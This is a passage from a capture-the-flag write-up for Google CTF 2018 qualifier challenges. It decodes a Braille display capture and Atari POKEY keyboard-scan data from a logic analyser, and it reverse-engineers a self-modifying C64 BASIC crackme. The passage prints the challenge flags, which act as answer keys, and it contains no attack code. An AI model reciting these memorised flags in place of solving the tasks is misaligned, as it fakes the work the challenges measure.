[0,1,1,1,0,0,0]: 3\n    01: [0,0,0,0,0,0,1]: 1\n    1D: [0,0,1,1,1,0,1]: 4\n    19: [0,0,1,1,0,0,1]: 3\n    38: [0,1,1,1,0,0,0]: 3\n    0E: [0,0,0,1,1,1,0]: 3\n    12: [0,0,1,0,0,1,0]: 2\n    12: [0,0,1,0,0,1,0]: 2\n    05: [0,0,0,0,1,0,1]: 2\n    3B: [0,1,1,1,0,1,1]: 5\n    C0: [1,0,0,0,0,0,0]: 1\n\nThe initial three don't seem to work out. But `00:49:5E:4B` actually works as `<space>CTF`! All three characters have one extra bit set - this could indicate that they are uppercase. In regular English Braille capital characters are indicated with a special character preceding the letter that is meant to be capital. This might be impractical for a computer terminal.\n\n    00: [0,0,0,0,0,0,0]: 0\n    49: [1,0,0,1,0,0,1]: 3 C\n    5E: [1,0,1,1,1,1,0]: 5 T\n    4B: [1,0,0,1,0,1,1]: 4 F\n         ^\n         uppercase\n\nThe three following bits represent the right column of the Braille grid, and the three last bits represent the left column. Let's see what the full line looks like:\n\n                    o    o  o   o   oo   o   o   o   o  o   o   o   o \n    o        o  o   oo  o   o    o  oo  o   oo      o   oo   o  o   o \n            o            o  o               o       o           o   o \n    \n     o  oo  oo      oo   o  oo   o  o       oo  o    o  o   oo  oo   o\n     o  oo  o           oo  o   o   oo  o    o   o   o       o   o   o\n         o   o          o        o                   o      o        o\n    \n     o          o   oo\n    o   oo  oo      oo\n    o           o    o\n\nIf we try to decode these character using the [standard English Braille alphabet](https://en.wikipedia.org/wiki/English_Braille), we get more useful data, but a lot of the characters have special meaning rather than representing a single character:\n\n                    o    o  o   o   oo   o   o   o   o  o   o   o   o \n    o        o  o   oo  o   o    o  oo  o   oo      o   oo   o  o   o \n            o            o  o               o       o           o   o \n    ,       in? ,   h   ow? l   e   g   i   t   ??  s   h   e   l   l\n    \n     o  oo  oo      oo   o  oo   o  o       oo  o    o  o   oo  oo   o\n     o  oo  o           oo  o   o   oo  o    o   o   o       o   o   o\n         o   o          o        o                   o      o        o\n    ??  ??  ??      c   t   f   ow? h   ,?  d   e   ??  a   n   d   ??\n    \n     o          o   oo\n    o   oo  oo      oo\n    o           o    o\n    s   ??  ??  k   ??\n\nThe `??` are meant to be used as parts of special \"abbreviations\" in Braille, consisting of multiple characters that represent a commonly-used English word. After searching through a couple abbreviation appendices, we could not find any suitable abbreviation for the three-character code on the start of the second line above. But we could clearly see that the flag would be something like `CTF{hide_and_seek}`, we were very close.\n\nFinally, we found [Computer Braile Code](https://en.wikipedia.org/wiki/Computer_Braille_Code), specifically meant to be used for Braille representations of computer data. When using this encoding, we get:\n\n                    o    o  o   o   oo   o   o   o   o  o   o   o   o \n    o        o  o   oo  o   o    o  oo  o   oo      o   oo   o  o   o \n            o            o  o               o       o           o   o \n    1       9   1   h   {   l   e   g   i   t   @   s   h   e   l   l\n    \n     o  oo  oo      oo   o  oo   o  o       oo  o    o  o   oo  oo   o\n     o  oo  o           oo  o   o   oo  o    o   o   o       o   o   o\n         o   o          o        o                   o      o        o\n    ^   }   $       c   t   f   {   h   1   d   e   _   a   n   d   _\n    \n     o          o   oo\n    o   oo  oo      oo\n    o           o    o\n    s   3   3   k   }\n\nIt is possible that the first five bytes are not Braille characters, but control data for the device. \n\n([full decoder script](scripts/feel-it/Decode.hx))\n\nWe have the flag, but let's decrypt the full user interaction:\n\n    1 91Hnot an AT-SPI2 text widget                                 \n    1 91HBRLTTY 5.6                                                 \n    1 91H                                                           \n    1 91H{legit@shell ^}$                                           \n    1 91H{legit@shell ^}$C                                          \n    1 91H{legit@shell ^}$CT                                         \n    1 91H{legit@shell ^}$CTF                                        \n    1 91H{legit@shell ^}$CTF{                                       \n    1 91H{legit@shell ^}$CTF{                                       \n    1 91H{legit@shell ^}$CTF{                                       \n    1 91H{legit@shell ^}$CTF{                                       \n    1 91H{legit@shell ^}$CTF{                                       \n    1 91H{legit@shell ^}$ CTF{                                      \n    1 91H{legit@shell ^}$ CTF{                                      \n    1 91H{legit@shell ^}$ CTF{                                      \n    1 91H{legit@shell ^}$ CTF{                                      \n    1 91H{legit@shell ^}$ CTF{                                      \n    1 91H{legit@shell ^}$ CTF{h                                     \n    1 91H{legit@shell ^}$ CTF{h?                                    \n    1 91H{legit@shell ^}$ CTF{h?d                                   \n    1 91H{legit@shell ^}$ CTF{h?de                                  \n    1 91H{legit@shell ^}$ CTF{h?dE                                  \n    1 91H{legit@shell ^}$ CTF{h?De                                  \n    1 91H{legit@shell ^}$ CTF{hDe                                   \n    1 91H{legit@shell ^}$ CTF{h?De                                  \n    1 91H{legit@shell ^}$ CTF{hDe                                   \n    1 91H{legit@shell ^}$ CTF{h1De                                  \n    1 91H{legit@shell ^}$ CTF{h1dE                                  \n    1 91H{legit@shell ^}$ CTF{h1de                                  \n    1 91H{legit@shell ^}$ CTF{h1de_                                 \n    1 91H{legit@shell ^}$ CTF{h1de_a                                \n    1 91H{legit@shell ^}$ CTF{h1de_an                               \n    1 91H{legit@shell ^}$ CTF{h1de_and                              \n    1 91H{legit@shell ^}$ CTF{h1de_and_                             \n    1 91H{legit@shell ^}$ CTF{h1de_and_s                            \n    1 91H{legit@shell ^}$ CTF{h1de_and_s#                           \n    1 91H{legit@shell ^}$ CTF{h1de_and_s##                          \n    1 91H{legit@shell ^}$ CTF{h1de_and_s#                           \n    1 91H{legit@shell ^}$ CTF{h1de_and_s                            \n    1 91H{legit@shell ^}$ CTF{h1de_and_s3                           \n    1 91H{legit@shell ^}$ CTF{h1de_and_s33                          \n    1 91H{legit@shell ^}$ CTF{h1de_and_s33k                         \n    1 91H{legit@shell ^}$ CTF{h1de_and_s33k}                        \n    1 91Hnot an AT-SPI2 text widget\n\n`CTF{h1de_and_s33k}`\n\n## 220 Misc / Wired CSV ##\n\n**Description**\n\n> We have a photo and a CSV file. NOTE: The flag does not follow the CTF{...} format, but is clearly marked as the flag. Please add the CTF{...} around the flag manually when submitting.\n\n**Files provided**\n\n - [a ZIP file](files/wired-csv.zip) containing:\n   - `data.7z` - archive containing `data.csv`\n   - `wires.jpg`\n\n**Solution**\n\nLooking at the photo given:\n\n![](screens/wires.jpg)\n\nWe can see a Saleae logic analyser connected via some jumper cables and probes to a chip. The text on the chip reads:\n\n    AMI 8327VT\n    CO12294B-01\n      CO3051\n    ©   KOREA\n\nWith a quick search for the above strings, we can identify the chip as [Atari POKEY](https://en.wikipedia.org/wiki/Atari_POKEY). This chip has many functions on the Atari 8-bit computers. It is probably most notable for being a great sound synthesiser chip (for its price and time).\n\nHere is a pin-out diagram for the chip:\n\n![](screens/wires-pinout.png)\n\nBased on the notch in the top-left corner of the chip, we can figure out which pins of the chip are being probed with the logic analyser. In the top-left corner, two probes are connected to the VCC, which should just be a constant +5V (within tolerance).\n\nMore importantly, 8 probes are connected to the pins `K0`, `K1`, ..., `K5`, `KR1` and `KR2`. According to [this datasheet](http://krap.pl/mirrorz/atari/homepage.ntlworld.com/kryten_droid/Atari/800XL/atari_hw/pokey.htm#keyboard%20scan), these pins are related to the keyboard scan functionality of the POKEY.\n\nThe keyboard can be thought of as an 8x8 grid. Wires connect the rows and the columns of this grid. At each intersection of horizontal and vertical wire, there is a switch (i.e. the keyboard key). To figure out whether or not a particular key is currently being held, its column is pulled high. If the key is held, this connects the column to the row. Then we just check whether the key's row is high.\n\nThe above process is automated in the Atari computers with the assistance of the POKEY chip. Three lines (`K0`, `K1`, and `K2`) lead to a 3-to-8 multiplexer, which interprets the three inputs as a binary number and outputs a digital high on one of its eight outputs (connected to the columns of keyboard grid).\n\nThree other lines (`K3`, `K4`, and `K5`) are connected to a 8-way selector. Once again, the three lines are interpreted as a binary number. One of the selector's 8 inputs (connected to the rows of the keyboard grid) are selected based on the binary number and its value is then available as `KR1`.\n\n![](screens/wires-grid.png)\n\nNaturally, the computer does not know which keys to check beforehand; all keys need to be checked all the time. So the POKEY emits a repeating binary sequence on its `K0` ... `K5` pins, decoding a different key everytime the number changes. The numbers change at 15.7 KHz, so with 64 keys in total, this means all the keys of the keyboard are checked roughly every 4ms.\n\nSo we know what is going on with the pins that are being probed. Given that we are looking for a flag, we can expect that somebody typed the flag on the Atari keyboard and the logic analyser recorded this interaction happening. Let's finally have a look at the CSV file.\n\n    $ head data.csv\n     Time [s],Wire6-Analog,Wire7-Analog, Time [s],Wire0-Digital, Time [s],Wire1-Digital, Time [s],Wire2-Digital, Time [s],Wire3-Digital, Time [s],Wire4-Digital, Time [s],Wire5-Digital, Time [s],Wire6-Digital, Time [s],Wire7-Digital\n    0.000000000000000, 4.768121242523193, 4.773899555206299, 0.000000000000000, 0, 0.000000000000000, 0, 0.000000000000000, 0, 0.000000000000000, 1, 0.000000000000000, 0, 0.000000000000000, 0, 0.000000000000000, 1, 0.000000000000000, 1\n    0.000008000000000, 4.768121242523193, 4.773899555206299, 0.000000990000000, 1, 0.000065560000000, 1, 0.000194380000000, 1, 0.000451750000000, 0, 0.000452070000000, 1, 0.001480790000000, 1, 1.468471380000000, 0, 2.503182740000000, 0\n    0.000016000000000, 4.773141384124756, 4.778934478759766, 0.000065230000000, 0, 0.000194070000000, 0, 0.000451450000000, 0, 0.000965990000000, 1, 0.001480440000000, 0, 0.003537600000000, 0, 1.468535670000000, 1, 2.503689840000000, 1\n    0.000024000000000, 4.773141384124756, 4.773899555206299, 0.000129540000000, 1, 0.000322660000000, 1, 0.000708600000000, 1, 0.001480170000000, 0, 0.002508920000000, 1, 0.005594510000000, 1, 1.472585100000000, 0, 2.507288860000000, 0\n    0.000032000000000, 4.773141384124756, 4.773899555206299, 0.000193780000000, 0, 0.000451180000000, 0, 0.000965660000000, 0, 0.001994420000000, 1, 0.003537300000000, 0, 0.007651320000000, 0, 1.472649390000000, 1, 2.507799430000000, 1\n    0.000040000000000, 4.773141384124756, 4.773899555206299, 0.000258100000000, 1, 0.000579770000000, 1, 0.001222810000000, 1, 0.002508600000000, 0, 0.004565780000000, 1, 0.009708230000000, 1, 1.476698830000000, 0, 2.511395640000000, 0\n    0.000048000000000, 4.778161048889160, 4.778934478759766, 0.000322340000000, 0, 0.000708280000000, 0, 0.001479880000000, 0, 0.003022850000000, 1, 0.005594170000000, 0, 0.011765040000000, 0, 1.476763110000000, 1, 2.511904320000000, 1\n    0.000056000000000, 4.778161048889160, 4.778934478759766, 0.000386650000000, 1, 0.000836870000000, 1, 0.001737030000000, 1, 0.003537030000000, 0, 0.006622640000000, 1, 0.013821950000000, 1, 1.480812550000000, 0, 2.515507680000000, 0\n    0.000064000000000, 4.773141384124756, 4.778934478759766, 0.000450890000000, 0, 0.000965390000000, 0, 0.001994100000000, 0, 0.004051280000000, 1, 0.007651030000000, 0, 0.015878770000000, 0, 1.480876830000000, 1, 2.516015620000000, 1\n\nThe format is easy enough to parse, but there is a problem - the digital wires are not labelled. Which wire is `K0`? Which is the `KR1` output?\n\nWell, `K0` through `K5` emit a repeating binary sequence, generated by the POKEY that is completely independent of any user input. We should be able to find this sequence easily:\n\n![](screens/wires-keyscan.png)\n\nIn the CSV file, each of the digital wires has its own set of timestamps, and only changes in the detected values are shown. Our first step is to take samples at 15.7 KHz with the correct current values of each of the digital wires. The simplest way I could think of implementing this is to have a separate file reader per wire, reading lines whenever needed, otherwise reporting the last value.\n\nOne tiny detail you might notice from the pinout diagram above is that pin names are prefixed with `!` - we simply need to invert them to get the \"actual\" value. We still need to pay careful attention to the notation, since sometimes `K` values are used directly, sometimes `!K` values are specified.\n\nWith this we can visualise a sample of the data captured on the digital wires:\n\n([visualisation script](scripts/wired-csv/VisualiseWires.hx))\n\n    $ haxe --run VisualiseWires\n    ▌▌▌ ▌▌  \n     ▌▌ ▌▌  \n    ▌ ▌ ▌▌  \n      ▌ ▌▌  \n    ▌▌  ▌▌  \n     ▌  ▌▌  \n    ▌   ▌▌  \n        ▌▌  \n    ▌▌▌▌ ▌  \n     ▌▌▌ ▌  \n    ▌ ▌▌ ▌  \n      ▌▌ ▌  \n    ▌▌ ▌ ▌  \n     ▌ ▌ ▌  \n    ▌  ▌ ▌  \n       ▌ ▌  \n    ▌▌▌  ▌  \n     ▌▌  ▌  \n    ▌ ▌  ▌  \n      ▌  ▌\n\nIt is quite clear that the first six digital wires are, in order, `K0` through `K5`, since `K0` changes the most rapidly, `K1` half as fast, and so forth.\n\nNow we simply need to see what number is indicated by `K0` ... `K5` whenever `KR1` (or rather its inverse) goes high. We need to use a table like [this](https://www.atariarchives.org/c3ba/page004.php).\n\nBut there is another problem: printing out the keys whenever `KR1` is high produces almost unreadable data:\n\n([raw decoder script](scripts/wired-csv/RawCodes.hx))\n\n    $ haxe -main RawCodes -neko rc.n\n    $ neko rc.n\n    F F F F F L L L L L A G > S CAPS D > A G > S CAPS D > A G > G G G G G ; ; ; ; ;\n    (etc)\n\nThere is a lot of garbage data there, but we can see `FLAG` in the beginning, which should be a good sign. The problem is that each letter is repeated multiple times. But this actually makes sense - what if a letter is held for longer than a single full keyboard scan? It will be decoded multiple times. Considering the keyboard is fully scanned each 4ms, it is not very surprising that a key press would be registered on multiple scans.\n\nAdditionally, we see some data that is not just letters being repeated. Circuits are not perfect, and we can see some glitches as a result of this. Looking through the actual data, it seems many \"ghost\" keys are registered immediately after \"real\" keys are pressed. Another useful observation is that the keys that actually spell out the flag are typed relatively slowly.\n\nSo let's only print out key presses which happen at least 100ms after any other, and remove duplicates:\n\n([fixed decoder script](scripts/wired-csv/Codes.hx))\n\n    $ haxe -main Codes -neko c.n\n    $ neko c.n\n    F L S G ;   8 - B I T - H A R D W S R E - K E Y L O G E R\n\nIt is not perfect, but it is close. `A` got misread as `S` in the word `FLAG`, and it seems the same happened in the word `HARDWARE` as well. The `G` got de-duplicated in `KEYLOGGER` with our script. And indeed, probing the pins of the POKEY chip is a form of a hardware keylogger!\n\n`CTF{8-BIT-HARDWARE-KEYLOGGER}`\n\n## 113 RE / Shall we play a game? ##\n\n**Description**\n\n> Win the game 1,000,000 times to get the flag.\n\n**Files provided**\n\n - [a ZIP file](files/shall-we-play-a-game.zip) containing:\n   - `app.apk` - an Android application\n\n**Solution (TODO)**\n\n## 293 RE / Back to the Basics ##\n\n**Description**\n\n> You won't find any assembly in this challenge, only C64 BASIC. Once you get the password, the flag is CTF{password}. P.S. The challenge has been tested on the VICE emulator.\n\n**Files provided**\n\n - [a ZIP file](files/back-to-the-basics.zip) containing:\n   - `crackme.prg` - a Commodore 64 ROM / program\n\n**Solution**\n\nWe are given a PRG file for Commodore 64. As chance would have it, I had the VICE emulator installed already, so I had a look at what the program actually looks like when executed.\n\n![](screens/back-to-the-basics1.png)\n\nWe can try a password:\n\n![](screens/back-to-the-basics2.png)\n\nIt says it might take a while but the verdict is instantaneous. Well, let's have a look at the program itself.\n\n    $ xxd crackme.prg | head\n    0000000: 0108 1e08 0100 8f20 b2b2 b2b2 b2b2 b2b2  ....... ........\n    0000010: b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 003a  ...............:\n    0000020: 0802 008f 20b2 b2b2 2042 4143 4b20 a420  .... ... BACK . \n    0000030: 4241 5349 4353 20b2 b2b2 0057 0803 008f  BASICS ....W....\n    0000040: 20b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2   ...............\n    0000050: b2b2 b2b2 b2b2 b200 6b08 0a00 99c7 2831  ........k.....(1\n    0000060: 3535 293a 99c7 2831 3437 2900 8608 1400  55):..(147).....\n    0000070: 9720 3533 3238 302c 2036 3a97 2035 3332  . 53280, 6:. 532\n    0000080: 3831 2c20 363a 0098 0819 0099 224c 4f41  81, 6:......\"LOA\n    0000090: 4449 4e47 2e2e 2e22 0013 091e 0083 2032  DING...\"...... 2\n\nMost of it is not really readable, but there are some things that stand out, even in this very short sample. There are numbers, represented in readable ASCII. And the string `LOADING...` is surrounded with double quotes. Neither of these would occur in a compiled program, so indeed, the challenge description is true - we are looking at C64 BASIC, but where are the actual commands? The string `LOADING...` is the first thing printed to the screen, so we should expect a `PRINT` command just before it.\n\nWe can search for specifications of the PRG format. Apparently it represents a [Commodore BASIC tokenised file](http://fileformats.archiveteam.org/wiki/Commodore_BASIC_tokenized_file). To save space, BASIC commands could be represented with tokens, single-byte versions of the full strings. Normal text uses bytes with values in the range `20 ... 127`, but these tokens have the high bit set, so their values are in the range `128 ... 255`. These are not ASCII values, but [PETSCII](https://en.wikipedia.org/wiki/PETSCII), which does have significant overlaps with ASCII, e.g. in letters and numbers, which is why these are readable in the ASCII print-out next to the hexdump above.\n\nTo confirm our expectations, we can see that the token for `PRINT` is `0x99`. And indeed, this exact byte is right next to the string `LOADING...`.\n\nSo what we need is some way to convert all of the tokens in the PRG file into their text versions so we can try to understand the code and eventually the password. This is not really a decompiler, since the PRG file is really just as good as source code. What we need is called a \"detokeniser\", or a \"BASIC lister\", such as [this one](https://www.luigidifraia.com/c64/index.htm#BL).\n\nRunning the lister on the PRG file we have produces some results:\n\n    REM C64 BASIC LISTER V1.1F\n    REM (C) 2004-05 LUIGI DI FRAIA\n    REM LISTING OF FILE: Z:/DEVPROJECTS/STUFF/HACKCENTER/2018 06 4 GOOGLE CTF 2018 QUALS/BASIC/CRACKME.PRG\n    REM START ADDRESS: $0801\n    REM END ADDRESS+1: $87BF\n    REM SIZE (BYTES):   32702\n    1 REM ======================\n    2 REM === BACK TO BASICS ===\n    3 REM ======================\n    10 PRINTCHR$(155):PRINTCHR$(147)\n    20 POKE 53280, 6:POKE 53281, 6:\n    25 PRINT\"LOADING...\"\n    30 DATA 2,1,3,11,32,32,81,81,81,32,32,32,32,81,32,32,32,32,81,81,81,81,32,81,81,81,81,81,32,32,81,81,81,81,32,32,87,87,87,87\n    31 DATA 32,32,32,32,32,32,81,32,32,81,32,32,81,32,81,32,32,81,32,32,32,32,32,32,32,81,32,32,32,81,32,32,32,32,32,87,32,32,32,32\n    32 DATA 20,15,32,32,32,32,81,81,81,32,32,81,32,32,32,81,32,32,81,81,81,32,32,32,32,81,32,32,32,81,32,32,32,32,32,32,87,87,87,32\n    33 DATA 32,32,32,32,32,32,81,32,32,81,32,81,81,81,81,81,32,32,32,32,32,81,32,32,32,81,32,32,32,81,32,32,32,32,32,32,32,32,32,87\n    34 DATA 20,8,5,32,32,32,81,81,81,32,32,81,32,32,32,81,32,81,81,81,81,32,32,81,81,81,81,81,32,32,81,81,81,81,32,87,87,87,87,32\n    40 FOR I = 0 TO 39: POKE 55296 + I, 1: NEXT I\n    41 FOR I = 40 TO 79: POKE 55296 + I, 15: NEXT I\n    42 FOR I = 80 TO 119: POKE 55296 + I, 12: NEXT I\n    43 FOR I = 120 TO 159: POKE 55296 + I, 11: NEXT I\n    44 FOR I = 160 TO 199: POKE 55296 + I, 0: NEXT I\n    50 FOR I = 0 TO 199\n    51 READ C : POKE 1024 + I, C\n    52 NEXT I\n    60 PRINT:PRINT:PRINT:PRINT:PRINT\n    70 POKE 19,1: PRINT\"PASSWORD PLEASE?\" CHR$(5): INPUT \"\"; P$: POKE 19,0\n    80 PRINT:PRINT:PRINTCHR$(155) \"PROCESSING... (THIS MIGHT TAKE A WHILE)\":PRINT\"[                    ]\"\n    90 CHKOFF = 11 * 40 + 1\n    200 IF LEN(P$) = 30 THEN GOTO 250\n    210 POKE 1024 + CHKOFF + 0, 86:POKE 55296 + CHKOFF + 0, 10\n    220 GOTO 31337\n    250 POKE 1024 + CHKOFF + 0, 83:POKE 55296 + CHKOFF + 0, 5\n    2000 REM NEVER GONNA GIVE YOU UP\n    2001 REM\n    2010 POKE 03397, 00199 : POKE 03398, 00013 : GOTO 2001\n    31337 PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n    31345 GOTO 31345\n\nWe see a lot of what we would expect. `REM` is a comment \"command\" in BASIC. The fancy header is printed to the screen, then the program asks for the password. It checks whether our password is 30 characters in length. Let's try inputting a 30-character long password:\n\n![](screens/back-to-the-basics3.png)\n\nThis passes the first check, represented as a green heart in the progress bar. The program then takes quite a long time indeed to produce all the other red crosses. We can disable the speed limit on the emulator to make it produce the above in a matter of seconds.\n\nBut this is quite curious - where is all this checking done? Where does it print the 19 red crosses? There is clearly some direct memory access going on (`POKE ADDRESS, VALUE` writes `VALUE` to `ADDRESS`), but it is not nearly enough to override the program to do any meaningful password checking. Where is the password actually read? In the code we can see the only time the password is read is in `LEN(P$)`.\n\nSo clearly the detokenised code is not all there is. And indeed, if we open the program in a hex editor, it spans 32 KiB, with many binary data sections and many parts that are still clearly code (e.g. mentioning `CHKOFF`, a variable initialised in the code we have already seen). How come the detokeniser didn't read these?\n\nLooking at the PRG format page again, parsing a tokenised BASIC file should not be all that complicated:\n\n| Size (bytes) | Info |\n| --- | --- |\n| 2 | Destination address for program |\n| | **For each line:** |\n| 2 | Next line address |\n| 2 | Line number |\n| * | Code |\n| 1 | Null terminator |\n\n(all 2-byte values are little-endian)\n\nThe last line of the program is empty and has zeroes in both the \"next line address\" and the \"line number\" fields.\n\nThe \"next line address\" field might seem a little unnecessary, since clearly the lines are null-terminated. There are two important reasons to store the address anyway:\n\n 1. Performance - a `GOTO` command in BASIC (which finds a line with a given number and resumes execution flow from there) needs to only read 2 words (4 bytes) per line before it can look further; otherwise it would have to read entire lines\n 2. Binary data - while the null terminator terminates valid BASIC lines, programs can embed binary data (including null bytes) as well; referencing lines by their address allows BASIC to skip blocks of binary data without trying to parse them\n\nApart from this we need the token table for BASIC and we should be able to parse the program:\n\n([simple parser script](scripts/back-to-the-basics/Simple.hx))\n\n    $ haxe --run Simple\n    0801:     1: REM ======================\n    081E:     2: REM === BACK TO BASICS ===\n    083A:     3: REM ======================\n    0857:    10: PRINTCHR$(155):PRINTCHR$(147)\n    ...\n    0D63:  2001: REM\n    0D69:  2010: POKE 03397, 00199 : POKE 03398, 00013 : GOTO 2001\n    0D96: 31337: PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n    0DB5: 31345: GOTO 31345\n\nWell, if we follow the proper parsing rules, respecting the last line marker and only looking for lines based on the \"next line address\" field, we get exact the same result as before with the BASIC Lister. Not surprising, really.\n\nAt this point, there are two approaches we can take. We can try a more lenient parsing procedure - for example, the fact that any valid line is terminated with a null byte can help us; we can simply split the data on null bytes and try to detokenise all the \"lines\" in between. Alternatively, we can try to understand how the C64 (emulator) even knows to find the additional lines of code.\n\nDuring the CTF, we chose the former path, since it is very quick to implement. We parse as much as we can, but ignore lines longer than 100 characters - these are actually binary data, and BASIC does impose a limit on line length. In the following listing the first address printed for each line is its \"next line address\" field.\n\n([lenient parser script](scripts/back-to-the-basics/Lenient.hx))\n\n    $ haxe --run Lenient\n    081E <- 0801:     1: REM ======================\n    083A <- 081E:     2: REM === BACK TO BASICS ===\n    0857 <- 083A:     3: REM ======================\n    086B <- 0857:    10: PRINTCHR$(155):PRINTCHR$(147)\n    ...\n    0D63 <- 0D45:  2000: REM NEVER GONNA GIVE YOU UP\n    0D69 <- 0D63:  2001: REM\n    0D96 <- 0D69:  2010: POKE 03397, 00199 : POKE 03398, 00013 : GOTO 2001\n    0DB5 <- 0D96: 31337: PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n    0DC1 <- 0DB5: 31345: GOTO 31345\n    0000 <- 0DC1:     0: REM\n    0DEB <- 0DC7:  2001: POKE 03397, 00069 : POKE 03398, 00013\n    0E1F <- 0DEB:  2002: POKE 1024 + CHKOFF + 1, 81:POKE 55296 + CHKOFF + 1, 7\n    0E46 <- 0E1F:  2004: ES = 03741 : EE = 04981 : EK = 148\n    0E81 <- 0E46:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n    0E9D <- 0E81:  2009: POKE 1024 + CHKOFF + 1, 87\n    ---- <- 0E9D: -----: <BINARY>\n    13B7 <- 137C:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n    ...\n\n([full listing here](scripts/back-to-the-basics/listing1.txt))\n\nWe successfully parsed many more lines than before. Binary blobs in the file cannot be detected fully accurately without properly parsing BASIC commands, so some garbage data leaks through, but mostly the detection is successful.\n\nBefore we move on with the analysis of this additional code, let's also consider how the C64 knows where to look for this code. In the listing, you can see many of the lines show the same line number, e.g. 2001 is repeated twice in the sample above. If the program was input purely via the C64 BASIC interface, this could not happen - specifying the same line number would simply override that line with new code.\n\nIt would be impractical (or even impossible) to check that there are no duplicate line numbers in the program when it is loaded. So the BASIC interpreter can simply operate under the assumption that there are no duplicate lines present. The fact that lines store the address of the next line is an important hint to understand how the lines are checked. Storing the address of a following element is a familiar concept in data structures - it is a singly-linked list. Whenever BASIC is looking for a line, it iterates the linked list until it finds the correct number (or perhaps until it reaches its starting point). Whenever the end of the list marker is encountered, it can start looking from the program's loading address again; this way it is possible to `GOTO` a preceding line.\n\nIt is important to note that in C64 land, there is no concept of an NX bit, of data vs. code. There is only 64K of address space (and less actual memory still), and all of it is directly addressable with 2-byte addresses. There is nothing preventing the program from manipulating its own memory while it is running, using `POKE` statements. With this in mind, this line in particular starts to make sense:\n\n    0D96 <- 0D69:  2010: POKE 03397, 00199 : POKE 03398, 00013 : GOTO 2001\n\n`00397` (in decimal) is `0x0D45` (in hexadecimal), `00398` is `0x0D46`, `00199` is `0xC7`, `00013` is `0x0D`. `POKE` writes a single byte, so the two `POKE` statements together write the value `0x0DC7` (in little-endian) to address `0x0D45`. What is at this address?\n\n    0D63 <- 0D45:  2000: REM NEVER GONNA GIVE YOU UP\n\nIt is this seemingly innocent comment line. Keep in mind that its first two bytes store the \"next line address\". So now, after executing the two `POKE`s, instead of `0x0D63`, the line points to `0x0DC7`. After the `POKE`s, we `GOTO 2001`, which will now be found at address `0x0DC7`!\n\n    0DEB <- 0DC7:  2001: POKE 03397, 00069 : POKE 03398, 00013\n\nThis line now overrides the pointer back to `0x0D45`. This way the modification in the program is undone after its effect was used (i.e. the current line is one that was previously unreachable). I believe this is done so that dumping the memory after running the program would not be any more helpful than just looking at the original program. The same `POKE` process is repeated multiple times in the remainder of the code.\n\nOnce again, this was just an attempt to explain how the program hid its code from the lister (a simple anti-RE technique), but in this challenge just parsing all the code we could find was enough. Perhaps a more complex challenge could interleave lines in interesting ways, executing different code when a line is executed from its middle instead of its beginning?\n\nBut back to analysing what we have. In the listing (as well as a hexdump of the program), we can see 19 large blocks of binary data, each surrounded with some code. Remember that when checking our password, one heart (for correct length) and 19 crosses were printed. We can guess each code + binary block corresponds to a single check and depending on its result, a heart or a cross is printed.\n\nHere is the first check block (the blocks are conveniently separated by empty `REM` comments in the listing):\n\n    0DEB <- 0DC7:  2001: POKE 03397, 00069 : POKE 03398, 00013\n    0E1F <- 0DEB:  2002: POKE 1024 + CHKOFF + 1, 81:POKE 55296 + CHKOFF + 1, 7\n    0E46 <- 0E1F:  2004: ES = 03741 : EE = 04981 : EK = 148\n    0E81 <- 0E46:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n    0E9D <- 0E81:  2009: POKE 1024 + CHKOFF + 1, 87\n    ---- <- 0E9D: -----: <BINARY>\n    13B7 <- 137C:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n    13EA <- 13B7:  2905: POKE 1024 + CHKOFF + 1, A:POKE 55296 + CHKOFF + 1, B\n    1417 <- 13EA:  2910: POKE 03397, 00029 : POKE 03398, 00020 : GOTO 2001\n\nWe have already seen line `2001`, used to restore the line pointer.\n\nLine `2002` uses `CHKOFF`, and this variable is actually only used to keep track of the position of the \"progress bar\" displayed when checking our password. Symbol 81 in shifted PETSCII is a circle, and it is displayed [in yellow colour](https://www.c64-wiki.com/wiki/Color) - this is indeed what is shown in the progress bar while our password is being checked. But anyway, this line is not really important to us.\n\nLine `2004` defines some variables. If we look at what `03741` (`ES`) is in hexadecimal, we see it is `0x0E9D` - exactly matching the address of the binary data block! `04981` (`EE`) is `0x1375`, just two bytes shy of the line immediately after.\n\nLine `2005` then finally modifies some memory using `POKE`. Basically, `EK` is added to all the bytes of the memory range `ES ... EE` (modulo 256). We will see what the memory there decodes to soon.\n\nLine `2009` just changes the symbol in the progress bar. What is more interesting is its \"next line address\" field - it points into the binary data block, as if it were regular code. So what we expect at this point is that line `2005` decoded the binary block into valid BASIC code, which will be executed after line `2009`. Given that we haven't seen any mention of the `P$` variable so far (storing our password), we can expect the decoded BASIC code to actually do some meaningful checking.\n\nLine `2900` re-encodes the data block with the same procedure as before. This means that after the program executes, the memory of the program will be different, but still unreadable, so a memory dump won't be helpful (again).\n\nLine `2905` sets the progress bar symbol for the last time. However, the symbol type and its colour are stored in variables `A` and `B`, respectively. We haven't seen these in the code so far, so we expect them to be set in the decoded binary block, depending on the result of the password check.\n\nFinally, line `2910` repeats the `POKE` procedure to make sure BASIC can find the next line of code, along with the next password check.\n\nIn the listing we can see that all the binary blocks are surrounded with the same general code, but the `ES`, `EE`, and `EK` variables are given different values. We can look for all the lines of the form:\n\n    ES = ..... : EE = ..... : EK = ...\n\nAnd indeed, there are 19 of these. After reading their values, we can modify the program memory as needed and do another listing:\n\n    $ haxe --run Solve\n    081E <- 0801:     1: REM ======================\n    083A <- 081E:     2: REM === BACK TO BASICS ===\n    0857 <- 083A:     3: REM ======================\n    ...\n    0E46:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n    0E81:  2009: POKE 1024 + CHKOFF + 1, 87\n    0E9D:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n    0EEB:  2020: BA = ASC( MID$(P$, 1, 1) )\n    0F05:  2021: BB = ASC( MID$(P$, 2, 1) )\n    0F1F:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 